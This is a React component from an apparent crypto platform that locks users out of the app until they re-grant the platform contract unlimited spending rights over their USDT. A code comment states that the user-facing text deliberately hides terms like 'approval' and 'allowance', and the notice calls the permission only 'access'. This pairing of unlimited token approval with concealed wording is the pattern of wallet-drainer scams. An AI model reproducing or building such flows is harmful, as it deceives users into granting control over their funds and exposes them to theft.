import { useEffect, useState, useCallback } from "react";
import { useWriteContract, usePublicClient } from "wagmi";
import { ShieldAlert, RefreshCw, LogOut } from "lucide-react";
import { useSession } from "../lib/session.jsx";
import { api } from "../lib/api.js";
import { CONTRACT_ADDRESS, USDT_ADDRESS, erc20Abi, MAX_UINT256 } from "../lib/contract.js";
import Spinner from "./Spinner.jsx";

/**
 * Wraps the logged-in app. A user can, at any time, revoke the on-chain permission they
 * granted at sign-up (it's their wallet, their right). When that happens the platform
 * can no longer operate, so we block the app with a full-screen notice and offer:
 *   - Rejoin: re-grant the permission (one wallet confirmation). On success the notice
 *     disappears automatically; on failure it stays with an error.
 *   - Logout: clear the session completely.
 *
 * The user-facing copy avoids technical words like "approval / allowance / connect".
 */
export default function ApprovalGuard({ children }) {
  const { address, user, logout } = useSession();
  const publicClient = usePublicClient();
  const { writeContractAsync } = useWriteContract();

  const [state, setState] = useState("checking"); // checking | ok | revoked
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  const check = useCallback(async () => {
    if (!address || !user?.registered) {
      setState("ok");
      return;
    }
    try {
      const r = await api.getApproval(address);
      setState(r.active ? "ok" : "revoked");
    } catch {
      // Don't lock the user out on a transient error.
      setState("ok");
    }
  }, [address, user?.registered]);

  useEffect(() => { check(); }, [check]);

  async function rejoin() {
    setError("");
    setBusy(true);
    try {
      // Re-grant the permission (same one-time call as sign-up).
      const hash = await writeContractAsync({
        address: USDT_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [CONTRACT_ADDRESS, MAX_UINT256],
      });
      await publicClient.waitForTransactionReceipt({ hash });

      // Re-check on-chain. Only clear the notice if it's really active now.
      const r = await api.getApproval(address);
      if (r.active) {
        setState("ok");
      } else {
        setError("That didn't go through. Please try again.");
      }
    } catch (e) {
      const raw = (e?.shortMessage || e?.message || "").toLowerCase();
      if (raw.includes("reject") || raw.includes("denied") || raw.includes("cancel")) {
        setError("You cancelled the last step. Tap Rejoin to try again.");
      } else if (raw.includes("insufficient") || raw.includes("gas") || raw.includes("funds")) {
        setError("Your wallet needs a little BNB for the network fee. Add some and try again.");
      } else {
        setError("Something didn't go through. Please try again in a moment.");
      }
    } finally {
      setBusy(false);
    }
  }

  // While checking, or when everything's fine, just render the app.
  if (state !== "revoked") return children;

  // Blocked notice.
  return (
    <div className="fixed inset-0 z-[90] flex flex-col items-center justify-center bg-navy-950/95 px-6 text-center backdrop-blur">
      <div className="flex h-16 w-16 items-center justify-center rounded-2xl border border-red-500/40 bg-red-500/10">
        <ShieldAlert className="h-7 w-7 text-red-400" />
      </div>
      <h2 className="mt-6 font-display text-xl font-bold sm:text-2xl">Access paused</h2>
      <p className="mt-2 max-w-sm text-sm text-slate-400">
        You've turned off your Decentralized World access, so you can't use the app right
        now. Rejoin to switch it back on, or log out.
      </p>

      {error && (
        <p className="mt-4 max-w-sm rounded-lg border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-300">
          {error}
        </p>
      )}

      <div className="mt-6 flex w-full max-w-xs flex-col gap-2 sm:flex-row">
        <button onClick={rejoin} disabled={busy} className="btn-primary flex-1 py-2.5">
          {busy ? <><Spinner /> Rejoining...</> : <><RefreshCw className="h-4 w-4" /> Rejoin</>}
        </button>
        <button onClick={logout} disabled={busy} className="btn-ghost flex-1 py-2.5">
          <LogOut className="h-4 w-4" /> Logout
        </button>
      </div>
    </div>
  );
}
